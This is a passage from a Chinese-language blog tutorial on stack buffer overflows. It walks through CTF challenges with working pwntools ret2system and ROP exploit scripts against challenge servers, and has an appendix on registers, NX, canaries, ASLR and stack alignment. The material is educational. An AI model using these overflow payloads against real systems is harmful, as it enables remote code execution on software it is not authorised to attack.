+<p>要让程序执行system函数，就要将system地址写入返回地址，这样当程序执行到返回地址时，system函数就会执行。执行时system函数会寻找<strong>ebp+8（第一个参数的位置）</strong>的位置来输入参数，因此我们需要将&#x2F;bin&#x2F;sh地址写入ebp+8位，才能成功使system(“&#x2F;bin&#x2F;sh”)执行。这里的ebp+8位中的ebp是system函数执行时的ebp，还记得我们在栈结构中了解到的，执行函数时，会先push ebp，即system所处位置就是system的ebp。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack19.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>exp如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26550</span>)</span><br><span class="line">sys_addr=<span class="number">0x8048320</span></span><br><span class="line">binsh_addr=<span class="number">0x804A024</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>+p32(sys_addr)+p32(<span class="number">0x123</span>)+p32(binsh_addr)<span class="comment">#p32(0x123)为随意构造的虚假eip。p32表示32位地址格式</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>成功获取flag：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack20.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<h2 id="3-3-64位system"><a href="#3-3-64位system" class="headerlink" title="3.3 64位system"></a>3.3 64位system</h2><p>64位程序和32位不同。x64 中的前六个参数依次保存在 rdi, rsi, rdx, rcx, r8 和 r9 寄存器中，因此要想使得system的参数位bin&#x2F;sh，就要控制rdi寄存器。我们可以利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>
+<p>我们想使rdi寄存器的值为bin&#x2F;sh的地址，最简单的就是l利用pop rdi汇编指令，在pop rdi后，如果有ret指令，就可以回到程序原来执行的地方，这时我们就可以控制程序流程了，也就是说，我们要找到<strong>pop rdi, ret</strong> 的汇编片段才可以。在这里，我们使用ROPgadget工具，来寻找pop rdi,ret。ROPgadget 是一个用于查找 Return-Oriented Programming（ROP） 链的工具。（详细见附录）</p>
+<p>例题：<a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#jarvisoj_level2_x64" >https://buuoj.cn/challenges#jarvisoj_level2_x64 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。题目名字：<strong>jarvisoj_level2_x64</strong>。</p>
+<p>这道题和上面那道的功能一样，即反汇编几乎一样，就不一步步分析了。但是由于这道题是64位，无法像上面那样构造，因此我们需要找到pop rdi,ret的汇编片段</p>
+<p>使用如下指令:</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary level2_x64 --only &#x27;pop|ret&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack21.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>可以看到存在pop rdi, ret指令，地址为0x4006b3。</p>
+<p>我们先利用pop rsi, ret 将bin&#x2F;sh参数地址传给rdi寄存器，然后ret返回，返回到system函数地址就可以顺利执行system(‘bin&#x2F;sh’)了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack23.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>exp如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27195</span>)</span><br><span class="line">binsh=<span class="number">0x0600A90</span></span><br><span class="line">system=<span class="number">0x04004C0</span></span><br><span class="line">pop_rdi=<span class="number">0x04006b3</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> +p64(pop_rdi) + p64(binsh) + p64(system) </span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>成功溢出：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/stack/stack22.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>如果不成功，是因为64位系统需要栈对齐，在system函数前加个ret指令地址就可以。（详细见附录）</p>
+<h1 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h1><h2 id="1、寄存器"><a href="#1、寄存器" class="headerlink" title="1、寄存器"></a>1、寄存器</h2><p><strong>一般寄存器:AX、BX、CX、DX。</strong> AX:累积暂存器，BX:基底暂存器，CX:计数暂存器，DX:资料暂存器<br><strong>索引暂存器:SI、DI</strong>。 SI:来源索引暂存器，DI:目的索引暂存器<br><strong>堆叠、基底暂存器:SP、BP</strong>。 SP:堆叠指标暂存器，BP:基底指标暂存器</p>
+<p>EAX、ECX、EDX、EBX：为ax,bx,cx,dx的延伸，各32位元<br>ESI、EDI、ESP、EBP：为si,di,sp,bp的延伸，32位元<br>eax, ebx, ecx, edx, esi, edi, ebp, esp等都是X86 汇编语言中CPU上的通用寄存器的名称，是32位的寄存器。如果用C语言来解释，可以把这些寄存器当作变量看待。比方说：add eax,-2 ; &#x2F;&#x2F;可以认为是给变量eax加上-2这样的一个值。</p>
+<p>这些32位寄存器有多种用途，但每一个都有“专长”，有各自的特别之处。<br>EAX 是”累加器”(accumulator), 它是很多加法乘法指令的缺省寄存器。<br>EBX 是”基地址”(base)寄存器, 在内存寻址时存放基地址。<br>ECX 是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。<br>EDX 则总是被用来放整数除法产生的余数。<br>ESI&#x2F;EDI分别叫做”源&#x2F;目标索引寄存器”(source&#x2F;destination index),因为在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目标串.<br>EBP是”基址指针”(BASE POINTER), 它最经常被用作高级语言函数调用的”框架指针”(frame pointer). 在破解的时候,经常可以看见一个标准的函数起始代码:<br>　　push ebp ;    将当前ebp的地址压入栈顶，方便函数栈帧在回收的时候找回原来的位置（保存当前ebp）<br>　　mov ebp,esp ;     将当前的ebp移动到当前esp的位置<br>　　sub esp, xxx ;    将当前的esp往低地址处移动XXX的空间 （为函数开辟适当的空间）<br>　　…<br>　　这样一来,EBP 构成了该函数的一个框架, 在EBP上方分别是原来的EBP, 返回地址和参数. EBP下方则是临时变量. 函数返回时作 mov esp,ebp&#x2F;pop ebp&#x2F;ret 即可。ESP 专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。</p>
+<h2 id="2、NX"><a href="#2、NX" class="headerlink" title="2、NX"></a>2、NX</h2><p>NX（DEP）(数据执行保护 Data Execution Prevention)。NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+<p>DEP特性需要硬件页表机制来提供支持。X86 32位架构页表上没有NX(不可执行）位，只有X86 64位才支持NX位。 Linux在X86 32位CPU没有提供软件的DEP机制，在64位CPU则利用NX位来实现DEP（当前Linux很少将该特性说成DEP)。</p>
+<h2 id="3-、CANARY-栈保护-："><a href="#3-、CANARY-栈保护-：" class="headerlink" title="3 、CANARY(栈保护)："></a>3 、CANARY(栈保护)：</h2><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
+<h2 id="4-、PIE（ASLR）："><a href="#4-、PIE（ASLR）：" class="headerlink" title="4 、PIE（ASLR）："></a>4 、PIE（ASLR）：</h2><p>内存地址随机化机制（address space layout randomization)，有以下三种情况：<br>0-表示关闭进程地址空间随机化<br>1-表示将mmap的基址，stack和vdso页面随机化<br>2-表示在1的基础上增加堆（heap）的随机化</p>
+<h2 id="5-、bss段"><a href="#5-、bss段" class="headerlink" title="5 、bss段"></a>5 、bss段</h2><p><strong>bss段</strong>（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。bss属于静态内存分配。比如int a。</p>
+<p><strong>data段</strong>，数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。属于静态内存分配。比如int a&#x3D; 1。</p>
+<p><strong>text段</strong>，代码段（code segment&#x2F;text segment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。 </p>
+<p><strong>heap</strong>，堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p>
+<p><strong>stack</strong>，栈又称堆栈，是用户存放程序临时创建的局部变量，也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存&#x2F;恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。</p>
+<h2 id="6、-ROP"><a href="#6、-ROP" class="headerlink" title="6、 ROP"></a>6、 ROP</h2><p>ROP的全称为Return-oriented programming（<strong>返回导向编程</strong>），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p>
+<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。多个gadget可以组合到一起，进而可以执行多条汇编指令，从而达到目的。ROP 攻击一般得满足如下条件：1）程序存在溢出，并且可以控制返回地址。2）可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p>
+<p>一般先通过溢出找到EIP的位置，执行ret指令，使得代码执行到我们想要的位置，但是这样的话，通常只能执行一个地址的指令，无法满足我们执行多个指令的需求。因此为了执行多个指令，我们将带有ret指令的地址写入，这样在执行指令完毕后就可以返回到溢出的位置，接着执行我们注入的指令。比如在EIP写入pop_eax_ret的地址，在执行时，就会跳到pop eax的地址，pop eax执行完，通过ret指令再返回当前位置，这时如果我们EIP后面注入了其它命令，就可以顺利执行了。</p>
+<h2 id="7-、system栈对齐"><a href="#7-、system栈对齐" class="headerlink" title="7 、system栈对齐"></a>7 、system栈对齐</h2><p>64位ubuntu18以上系统调用system函数时需要栈对齐。</p>
+<p>64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐，rsp的最低字节必须为0x00（栈以16字节对齐），否则无法运行system指令。如果执行了一个对栈地址的操作指令（比如pop,ret,push等等，但如果是mov这样的则不算对栈的操作指令），那么栈地址就会+8或是-8。为使rsp对齐16字节，核心思想就是增加或减少栈内容，使rsp地址能相应的增加或减少8字节，这样就能够对齐16字节了。因为栈中地址都是以0或8结尾，0已经对齐16字节，因此只需要进行奇数次pop或push操作，就能把地址是8结尾的rsp变为0结尾，使其16字节对齐。</p>
+<p>解决方法：</p>
+<ol>
+<li>去将system函数地址+1，此处的+1，即是把地址+1，也可以理解为：+1是为了跳过一条栈操作指令（我们的目的就是跳过一条栈操作指令，使rsp十六字节对齐，跳过一条指令，自然就是把8变成0了）。但又一个问题就是，本来+1是为了跳过一条栈操作指令，但是你也不知道下一条指令是不是栈操作指令，如果不是栈操作指令的话（你加一之后有可能正好是mov这种指令，也有可能人家指令是好几个字节，你加一之后也没有到下一个指令呢），+1也是徒劳的，要么就继续+1，一直加到遇见一条栈操作指令为止（最大加16次就能成功）</li>
+<li>直接在调用system函数地址之前去调用一个ret指令。因为本来现在是没有对齐的，那我现在直接执行一条对栈操作指令（ret指令等同于pop rip，该指令使得rsp+8，从而完成rsp16字节对齐），这样system地址所在的栈地址就是0结尾，从而完成了栈对齐。</li>
+</ol>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 栈溢出基础知识+函数调用过程</li>
+        <li><strong>Author:</strong> wutong</li>
+        <li><strong>Created at:</strong> 2023-07-05 22:19:26</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2023-07-07 18:17:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://wutong01304.github.io/2023/07/05/stack/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Stack/">#Stack</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Basic-Knowledge/">#Basic Knowledge</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/07/02/Hexo+github/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">Hexo+github搭建个人博客</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">栈溢出基础知识+函数调用过程</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%A0%88%E7%BB%93%E6%9E%84"><span class="nav-text">一、栈结构</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">二、函数调用过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">三、栈溢出基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">3.1基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E6%9E%84%E9%80%A0system"><span class="nav-text">3.2 构造system</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-64%E4%BD%8Dsystem"><span class="nav-text">3.3 64位system</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95%EF%BC%9A"><span class="nav-text">附录：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-text">1、寄存器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81NX"><span class="nav-text">2、NX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E3%80%81CANARY-%E6%A0%88%E4%BF%9D%E6%8A%A4-%EF%BC%9A"><span class="nav-text">3 、CANARY(栈保护)：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E3%80%81PIE%EF%BC%88ASLR%EF%BC%89%EF%BC%9A"><span class="nav-text">4 、PIE（ASLR）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E3%80%81bss%E6%AE%B5"><span class="nav-text">5 、bss段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6%E3%80%81-ROP"><span class="nav-text">6、 ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E3%80%81system%E6%A0%88%E5%AF%B9%E9%BD%90"><span class="nav-text">7 、system栈对齐</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">wutong</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.2.1</a>
+        </div>
+        
+        
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
